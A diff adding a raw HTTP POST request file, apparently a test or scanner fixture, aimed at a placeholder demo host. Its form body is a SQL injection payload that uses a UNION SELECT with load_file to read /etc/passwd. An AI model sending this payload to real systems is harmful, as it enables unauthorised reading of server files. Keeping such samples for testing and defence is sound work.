@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Connection: close
+
+input=1 union select load_file(&#39;/etc/passwd&#39;)
